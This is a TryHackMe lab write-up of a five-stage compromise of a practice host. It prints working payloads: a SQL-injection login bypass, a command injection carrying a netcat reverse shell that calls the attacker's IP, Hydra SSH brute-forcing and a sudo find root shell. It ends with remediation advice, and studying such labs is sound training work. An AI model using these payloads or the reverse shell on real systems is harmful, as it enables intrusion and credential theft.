---
title: "Operation Promotion: A Five-Stage Compromise of RecruitCorp (SQLi → IDOR → RCE → Credential Harvesting → Root)"
tags: [tryhackme, pentest, writeup, sqli, idor, command-injection, privesc]
room: Operation Promotion
target_ip: 10.49.177.36
date: 2026-10-13
result: Root — both flags captured
---

# Operation Promotion: A Five-Stage Compromise of RecruitCorp
### (SQL Injection → IDOR → Command Injection → Credential Harvesting → Root)

---

## Task Scenario

> You are up for promotion at **Hadron Security**. Your senior lead, Mara, has handed you a solo engagement against **RecruitCorp**, a small recruiting firm with a public-facing portal. Compromise the host, capture the flags, and demonstrate that you are ready for the Penetration Tester title.

**Target:** `10.49.177.36` (RecruitCorp Careers Portal)
**Objective:** Obtain `user.txt` and `flag.txt`
**Access method:** TryHackMe AttackBox / VPN

![Task Scenario](images/01-task-scenario.png)

---

## Summary

RecruitCorp's public careers portal was taken from unauthenticated outsider to **root on the underlying host** through a chain of five linked weaknesses, each one unlocking the next:

1. **SQL injection** in the `/admin/` login form (`admin' OR '1'='1`) defeated authentication entirely, logging in as `admin` with no valid password.
2. An **IDOR** in the post-login "User Lookup" feature let every user record in the system be dumped by simply incrementing a numeric `id` parameter — no authorization check tied the requester to the record being viewed.
3. One of those leaked records (a `system` service account, `sysmaint`) disclosed the path to an internal diagnostic script, `ping.php`, which turned out to be vulnerable to **OS command injection** via its `host` parameter — giving code execution as `www-data`.
4. From that shell, looting the web root surfaced a **plaintext SQLite user database** and a **`db.conf`** file holding a bcrypt hash tied to a real system account, `jford`.
5. A content clue on the homepage ("Spring 2026 Hiring Drive") was turned into a small, **targeted mutated wordlist** (hashcat `dive.rule`), which a **Hydra SSH brute-force** matched against `jford`'s real password — yielding `user.txt` and an interactive SSH session.
6. `sudo -l` showed `jford` could run `/usr/bin/find` as root with **NOPASSWD** — a textbook **GTFOBins** privilege escalation path — which was used to spawn a root shell and recover `flag.txt`.

**Flags captured:**

| Flag | Value |
|------|-------|
| `user.txt` |
| `flag.txt` | 

---

## Techniques Used

| # | Category | Technique | MITRE ATT&CK (approx.) |
|---|----------|-----------|-------------------------|
| 1 | Reconnaissance | Full TCP port/service scan (Nmap) | T1046 — Network Service Discovery |
| 2 | Reconnaissance | Web directory brute-forcing (Gobuster) | T1595.003 — Active Scanning |
| 3 | Reconnaissance | SMB null-session share enumeration | T1135 — Network Share Discovery |
| 4 | Initial Access | SQL Injection — authentication bypass | T1190 — Exploit Public-Facing Application |
| 5 | Discovery | IDOR — sequential ID / broken access control enumeration | T1087 — Account Discovery |
| 6 | Execution | OS Command Injection | T1059 — Command and Scripting Interpreter |
| 7 | Execution | Reverse shell delivery & handling | T1071 / T1105 — C2 Channel / Ingress Tool Transfer |
| 8 | Credential Access | Local file / config inspection (credential looting) | T1552.001 — Credentials in Files |
| 9 | Credential Access | Database dumping (plaintext credentials) | T1555 — Credentials from Password Stores |
| 10 | Credential Access | OSINT-informed wordlist generation (rule-based mutation) | T1110.001 — Password Guessing |
| 11 | Credential Access | Online service brute-force (Hydra → SSH) | T1110.001 — Password Guessing |
| 12 | Privilege Escalation | Sudo misconfiguration abuse (GTFOBins — `find`) | T1548.003 — Sudo and Sudo Caching |

---

## Commands / Codes Used

### 1. Reconnaissance — Full Port & Service Scan

```bash
nmap -sC -sV -p- -oN initial_scan.txt 10.49.177.36
```

**Flags explained:**
- `-sC` — runs Nmap's default script set (banner grabs, basic enum scripts)
- `-sV` — probes open ports to determine the exact service/version running
- `-p-` — scans the full 65535-port range instead of just the top 1000, so nothing non-standard is missed
- `-oN` — saves normal-format output to a file for later reference

**Why used:** First-touch recon to map the full attack surface before doing anything targeted.

**Result:**
- `22/tcp` — OpenSSH 9.6p1 (Ubuntu)
- `80/tcp` — Apache 2.4.58, page title "RecruitCorp - Careers Portal", `robots.txt` disallowing `/admin/` — an immediate lead toward a hidden admin panel
- `139/445/tcp` — Samba SMB
- SMB script output flagged **message signing enabled but not required** — a configuration weakness, though not directly exploited in this engagement

![Nmap scan results](images/02-nmap-scan.png)

---

### 2. Reconnaissance — Directory Brute-Force

```bash
gobuster dir -u http://10.49.177.36 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,js
```

**Flags explained:**
- `-u` — target URL
- `-w` — wordlist of candidate directory/file names to probe
- `-x` — file extensions to append and test alongside each word (catches `admin.php`, `config.bak`, etc., not just bare directory names)

**Why used:** To confirm what `robots.txt` hinted at and discover anything else not linked from the visible site.

**Result:** Confirmed `/admin` (HTTP 301 redirect → login page) and `/config` (HTTP 403 — exists, but access is blocked at the web-server level).

![Gobuster directory scan](images/03-gobuster-dirscan.png)

---

### 3. Reconnaissance — SMB Share Enumeration

```bash
enum4linux -a 10.49.177.36
```

**Why used:** `-a` runs enum4linux's full enumeration suite (users, shares, OS info, password policy) in one pass against SMB. Part of this run failed (no SMB1 fallback, empty user listing) because the server only supports SMB2+, but the **share enumeration portion still succeeded**, confirming a share called `public` was mappable anonymously.

![SMB share enumeration](images/06-smb-share-enum.png)

```bash
smbclient //10.49.177.36/public -N
```

**Flags explained:** `-N` suppresses the password prompt and connects with null/anonymous authentication.

```
smb: \> ls
smb: \> get README.txt
smb: \> exit
```

**Why used:** Once connected, `ls` lists share contents and `get` downloads a file of interest for offline review.

**Result:** The share only contained a placeholder `README.txt` ("This share is reserved for future internal file distribution. Nothing to see here yet.") — a dead end for this engagement, but confirms anonymous SMB access was correctly identified and checked as part of thorough recon.

![smbclient public share](images/10-smbclient-public-share.png)

---

### 4. Initial Access — SQL Injection (Authentication Bypass)

**Target:** `http://10.49.177.36/admin/` login form

**Payload (Username field, any value in Password):**
```sql
admin' OR '1'='1
```

**How it works:** The login form builds its SQL query by directly concatenating user input (no parameterized queries), later confirmed from source:

```php
$query = "SELECT id, username FROM users WHERE username='$u' AND password='$p'";
$res = $db->query($query);
```

Submitting `admin' OR '1'='1` as the username turns the query into:

```sql
SELECT id, username FROM users WHERE username='admin' OR '1'='1' AND password='...'
```

Because `'1'='1'` is always true, the `WHERE` clause matches the **first row in the table** regardless of password, logging the attacker in as that account without ever knowing a valid credential.

![SQL injection login bypass](images/04-sqli-login-bypass.png)

**Result:** Instantly redirected to `/admin/dashboard.php`, authenticated as `admin`.

![Admin dashboard after bypass](images/05-admin-dashboard.png)

---

### 5. Discovery — IDOR (Broken Access Control / User Enumeration)

**Target:** `http://10.49.177.36/admin/users/lookup.php?id=N`

**How it works:** The dashboard's "User Lookup" widget takes a raw numeric `id` from the URL and returns that user's full record, with **no check that the logged-in user is authorized to view that specific record**. Simply changing `id` in the address bar walks through every account in the system:

```
http://10.49.177.36/admin/users/lookup.php?id=1   → admin       (role: admin)
http://10.49.177.36/admin/users/lookup.php?id=2   → mvasquez    (role: recruiter)
http://10.49.177.36/admin/users/lookup.php?id=7   → sysmaint    (role: system)
```

![User lookup - id 1 (admin)](images/07-user-lookup-id1-admin.png)
![User lookup - id 2 (mvasquez)](images/08-user-lookup-id2-mvasquez.png)
![User lookup - id 7 (sysmaint, reveals ping.php)](images/09-user-lookup-id7-sysmaint.png)

**Why it mattered:** Record `id=7` (`sysmaint`, role `system`) had this note field:

> *"Service account for /admin/sysmaint-checks/ping.php. Do not disable."*

This single leaked note handed over the exact path to an internal, otherwise-undiscoverable diagnostic endpoint — the pivot point into code execution.

---

### 6. Execution — OS Command Injection

**Step 1 — Parameter discovery.** Visiting the disclosed endpoint with no parameters returned a usage hint instead of a generic error — the application itself told us the expected parameter name:

```
http://10.49.177.36/admin/sysmaint-checks/ping.php
```
```
Usage: /admin/sysmaint-checks/ping.php?host=<target>
```

![ping.php parameter discovery](images/11-pingphp-param-discovery.png)

**Step 2 — Confirm injection.** Chained a second command onto the `host` value using a shell metacharacter:

```
http://10.49.177.36/admin/sysmaint-checks/ping.php?host=127.0.0.1; id
```

**How it works:** The backend almost certainly builds a shell command directly from user input, e.g. `shell_exec("ping -c 1 " . $_GET['host'])`. The `;` character terminates the intended `ping` command and starts a new one (`id`), and because there's no input sanitization or allow-listing, both execute.

**Result:** Normal ping output, followed immediately by:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Remote code execution confirmed as the web server user, `www-data`.

![Command injection confirmed](images/12-pingphp-command-injection-confirmed.png)

---

### 7. Execution — Reverse Shell Delivery

**Step 1 — Generate the payload** via [revshells.com](https://revshells.com) (`nc mkfifo` type — a named-pipe-based reverse shell that works even without `nc -e` support):

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.159.204 4444 >/tmp/f
```

**How it works:** Creates a named pipe (`/tmp/f`), pipes an interactive shell's input/output through it, and connects that pipe out to the attacker's listening `nc` on port 4444 — effectively making the target's shell interactive over the network connection. The IP used must be the **attacker's own address reachable from the target** (confirmed via the reachability test in Troubleshooting Notes below), not the target's own IP.

![revshells.com payload with correct attacker IP](images/13-revshells-payload-correct-ip.png)

**Step 2 — Start the listener.** Used [Penelope](https://github.com/brightio/penelope) instead of plain `nc` — it auto-detects the shell type, upgrades it to a full PTY, and logs the session automatically:

```bash
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py
python3 penelope.py -p 4444
```

![Penelope listener running](images/14-penelope-listener-setup.png)

**Step 3 — Trigger the payload.** Fired the URL-encoded command through the vulnerable `host` parameter via the browser address bar (browser delivery was used after `curl` was blocked — see Troubleshooting Notes):

```
http://10.49.177.36/admin/sysmaint-checks/ping.php?host=127.0.0.1;%20rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.159.204%204444%20%3E%2Ftmp%2Ff
```

![Browser firing the reverse shell payload](images/15-browser-trigger-reverse-shell.png)

**Result:** Penelope caught the callback and presented an interactive, PTY-upgraded shell as `www-data` on host `recruitcorp`:

```bash
whoami    # www-data
ls -la    # confirmed web root layout: admin/, config/, index.php, robots.txt, style.css
```

![Reverse shell caught as www-data](images/16-penelope-shell-caught-wwwdata.png)

---

### 8. Credential Access — Config File & Source Code Looting

```bash
cat /var/www/html/config/db.conf
```

**Why used:** Files inside the web root aren't always reachable from outside (recall `/config` returned HTTP 403 to Gobuster), but they're still readable locally by the `www-data` shell. This directly exposed the application's DB connection details:

```
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_engine=sqlite3
```

The username `jford` matched a **real, locked-down home directory** on the system (`/home/jford`, `drwxr-x---`) seen earlier during enumeration — meaning this bcrypt hash belongs to an actual Linux login, not just a web-app account.

![db.conf credentials discovered](images/17-dbconf-credentials-found.png)

```bash
cat /var/www/html/admin/index.php
```

**Why used:** Reading the application's own source confirmed the exact SQL injection root cause shown in Section 4 (raw string concatenation, no prepared statements).

![index.php vulnerable source code](images/18-indexphp-source-sqli-vuln-code.png)

```bash
sqlite3 /var/lib/recruitcorp/app.db
sqlite> .tables
sqlite> select * from users;
```

**Why used:** `db.conf` named the exact database engine and path — querying it directly dumped the full `users` table, including every web-portal account **in plaintext** (e.g. `admin:A!7s2f9DkLp_Q3e`, `mvasquez:pw_mv_4831`, `sysmaint:pw_sm_8841`, etc.).

**Note:** `jford` was **not** present in this table — confirming it's a separate, OS-level account rather than a web-app login, and that the bcrypt hash from `db.conf` was the credential that actually mattered for further access.

![sqlite3 app.db plaintext dump](images/19-sqlite3-appdb-dump.png)

---

### 9. Credential Access — OSINT-Informed Wordlist + SSH Brute-Force

Brute-forcing the bcrypt hash directly against `rockyou.txt` was attempted but was impractically slow (bcrypt is deliberately computation-heavy, so even modest wordlists take a long time without a strong hint). Instead, a contextual clue from the target's own homepage was used to build a **much smaller, targeted** wordlist.

The Careers Portal homepage displayed a themed banner:

> **"Spring 2026 Hiring Drive"** — *"Our spring intake is now open…"*

![Homepage "Spring 2026" banner](images/20-homepage-spring2026-banner.png)

```bash
echo "spring2026" > base.txt
hashcat --stdout base.txt -r /usr/share/hashcat/rules/dive.rule > wordlist.txt
wc -l wordlist.txt   # ~98,670 candidate passwords generated
```

**How it works:** `hashcat --stdout` doesn't crack anything itself — it just **applies a rule file's mutations** to a seed word and prints every resulting candidate. The `dive.rule` set applies thousands of common transformations (capitalization, leet-speak substitutions, appended symbols/numbers, year variants, etc.) to `spring2026`, producing a wordlist that is small (under 100k entries) but heavily weighted toward realistic human password patterns based on that one seed — far more efficient than blind brute-forcing an unrelated list.

![hashcat dive.rule wordlist generation](images/21-hashcat-dive-rule-wordlist.png)

```bash
hydra -l jford -P wordlist.txt 10.49.177.36 ssh
```

**Flags explained:**
- `-l jford` — test this single known username
- `-P wordlist.txt` — try each line of the generated wordlist as the password
- `ssh` — target the SSH service directly on port 22

**Why used instead of continuing to crack the bcrypt hash:** Hydra validates each guess against the **live SSH login**, which is the credential that actually matters for access — this sidesteps ever needing to successfully crack the bcrypt hash at all, since a correct SSH login is proof enough.

**Result:**
```
[22][ssh] host: 10.49.177.36   login: jford   password: spring2026!
```

![Hydra SSH brute-force success](images/22-hydra-ssh-bruteforce-success.png)

```bash
ssh jford@10.49.177.36
```

**Result:** Interactive SSH session authenticated as `jford`.

![SSH login as jford](images/23-ssh-login-as-jford.png)

```bash
cat user.txt
```

**Result:**
```
THM{bdbee0a91ebcb0b0fafde931223efe09}
```

![user.txt flag captured](images/24-user-txt-flag-captured.png)

---

### 10. Privilege Escalation — Sudo Misconfiguration (GTFOBins)

```bash
sudo -l
```

**Why used:** Standard first check after landing any foothold — lists what commands, if any, the current user is permitted to run as another user (commonly root) via `sudo`, and whether a password is required.

**Result:**
```
User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
```
`jford` can run `/usr/bin/find` as **root**, with **no password prompt at all**.

![sudo -l showing NOPASSWD find](images/25-sudo-l-nopasswd-find.png)

```bash
sudo find . -exec /bin/sh -p \; -quit
```

**How it works:** `find`'s `-exec` flag runs an arbitrary command against matched files. Since `find` itself is being executed as `root` via `sudo`, any command it spawns inherits that privilege level. This is a documented [GTFOBins](https://gtfobins.github.io/gtfobins/find/) technique:
- `-exec /bin/sh -p \;` — spawn an interactive shell for the first match found; `-p` tells `sh` to **preserve privileges** rather than drop them to the invoking (non-root) user, which some shells do by default when they detect a privilege mismatch
- `-quit` — stop `find` after the first match so it doesn't continue looping

**Result:** Dropped straight into a **root** shell.

```bash
whoami                                  # root
find / -name "flag.txt" 2>/dev/null     # located at /root/flag.txt
cat /root/flag.txt
```

**Result:**
```
THM{d999a1f6319a9c5b48c067dfab314ba2}
```

![Root shell via find + flag.txt captured](images/26-root-shell-flagtxt-captured.png)

---

## Other Details

### Troubleshooting Notes

- **Reverse shell callback IP mistake.** The first reverse-shell payload generated via revshells.com used the **target's own IP** (`10.49.177.36`) in the callback field instead of the attacker's own address — meaning the payload told the target to connect back to itself, which could never succeed. This was caught by first running a basic reachability test:
  ```bash
  # fired through the confirmed command injection
  http://10.49.177.36/admin/sysmaint-checks/ping.php?host=127.0.0.1; ping -c 3 <attacker_tun0_ip>
  ```
  ```bash
  # on Kali, watching for the ICMP replies
  sudo tcpdump -i tun0 icmp
  ```
  ICMP packets arriving on `tun0` confirmed the network path itself was fine, isolating the problem to the payload's IP field rather than a routing/firewall issue. **Lesson:** always verify the listener IP against `ip a` on the interface that actually routes to the target (VPN/`tun0`), never assume it from memory.

- **`curl` returned "Forbidden" while the browser succeeded with identical payloads.** Several reverse-shell attempts sent via `curl --data-urlencode` to the `host` parameter were rejected outright (`Forbidden`), including payloads that had already been proven to work when typed directly into the browser address bar. Testing wasn't able to conclusively pin down a single cause within the engagement window (candidates considered: User-Agent string, missing session cookie, or a WAF-style rule specifically profiling `curl`'s default headers). The practical workaround — firing the exact same payload through the browser's address bar instead of `curl` — was reliable and was used for the rest of the engagement. **Lesson:** when a seemingly-correct payload is unexpectedly blocked, don't assume the payload itself is wrong before ruling out the delivery method/client fingerprint.

- **bcrypt brute-forcing was abandoned in favor of a smarter wordlist.** An initial `hashcat -m 3200 jford_hash.txt /usr/share/wordlists/rockyou.txt` run against the full 14-million-entry `rockyou.txt` was started but was projected to take hours due to bcrypt's intentionally slow design, even without GPU acceleration available in the lab environment. Pivoting to a **contextual, rule-mutated** wordlist derived from a clue on the target's own homepage (Section 9) found the correct password almost immediately by comparison, and also avoided ever needing to crack the hash directly — Hydra validated the real SSH login instead.

---

### Attack Chain Overview

```
Nmap + Gobuster recon
   → /admin/ login exposed
            │
            ▼
SQL Injection (auth bypass)
   admin' OR '1'='1  →  logged in as admin
            │
            ▼
IDOR — User Lookup enumeration
   id=1..9 walked → sysmaint note leaks
   path to /admin/sysmaint-checks/ping.php
            │
            ▼
OS Command Injection (ping.php)
   ?host=127.0.0.1; <cmd>  →  RCE as www-data
            │
            ▼
Reverse shell (Penelope)
   → interactive www-data shell
            │
            ▼
Credential looting
   db.conf → jford bcrypt hash
   app.db  → plaintext web-app creds
   homepage → "spring2026" seasonal clue
            │
            ▼
hashcat dive.rule wordlist + Hydra SSH brute-force
   → valid SSH creds for jford (spring2026!)
   → user.txt captured
            │
            ▼
sudo -l → NOPASSWD /usr/bin/find
GTFOBins: find . -exec /bin/sh -p \; -quit
   → root shell
   → flag.txt captured
```

---

### Remediation Recommendations

| # | Finding | Recommendation |
|---|---------|-----------------|
| 1 | SQL Injection in login form | Use parameterized queries / prepared statements (e.g. PDO with bound parameters) for **all** database access — never concatenate user input directly into SQL strings. Apply server-side input validation as defense-in-depth. |
| 2 | IDOR on `/admin/users/lookup.php` | Enforce object-level authorization checks on every record lookup — verify the requesting user's role/permissions actually entitle them to view the requested `id`, not just that they are logged in at all. Consider non-sequential (UUID) identifiers to reduce trivial enumeration. |
| 3 | OS Command Injection in `ping.php` | Never pass user input directly into a shell execution function. Use language-native networking libraries instead of shelling out to `ping`, or at minimum strictly validate the `host` parameter against an allow-list pattern (e.g. valid IPv4/hostname regex) and use parameterized/argument-array execution (`escapeshellarg()` alone is not sufficient — prefer avoiding shell invocation entirely). |
| 4 | Plaintext passwords stored in `app.db` | Hash all stored credentials with a strong, salted algorithm (bcrypt/argon2) — plaintext storage means a single read-access compromise (as demonstrated here) exposes every account immediately. |
| 5 | Sensitive config file (`db.conf`) readable by the web server user | Store secrets outside the web root, restrict file permissions to the minimum service account that needs them, and consider a secrets manager / environment variables instead of a flat file committed alongside application code. |
| 6 | Weak/guessable password for `jford` (`spring2026!`) | Enforce a password policy that rejects dictionary words, company/seasonal themes, and predictable year-based patterns. Consider SSH key-based authentication instead of passwords entirely, combined with disabling password auth in `sshd_config`. |
| 7 | No SSH brute-force protection observed | Deploy `fail2ban` or equivalent to rate-limit and lock out repeated failed SSH login attempts. |
| 8 | Dangerous `sudo` grant (`NOPASSWD: /usr/bin/find`) | Avoid granting `sudo` access to any binary capable of spawning a shell or executing arbitrary commands (`find`, `vim`, `less`, `awk`, etc. — cross-reference against [GTFOBins](https://gtfobins.github.io/)) unless absolutely required, and even then scope it tightly (e.g. restrict `find`'s allowed arguments) rather than granting blanket NOPASSWD access. |
| 9 | SMB signing enabled but not required | Enforce SMB signing (`server signing = mandatory`) to prevent relay-style attacks, even though it wasn't directly exploited in this engagement. |

---

## Reference

- **Room:** [TryHackMe — Operation Promotion](https://tryhackme.com/room/operationpromotion)
- **Video walkthrough:** [YouTube](https://www.youtube.com/watch?v=FETeyhdS-IE)
- **Other write-up referenced:** [0xb0b — Operation Promotion](https://0xb0b.gitbook.io/writeups/tryhackme/2026/operation-promotion#shell-as-jford)
- **GTFOBins (find):** https://gtfobins.github.io/gtfobins/find/
- **Penelope (reverse shell handler):** https://github.com/brightio/penelope
- **revshells.com (payload generator):** https://revshells.com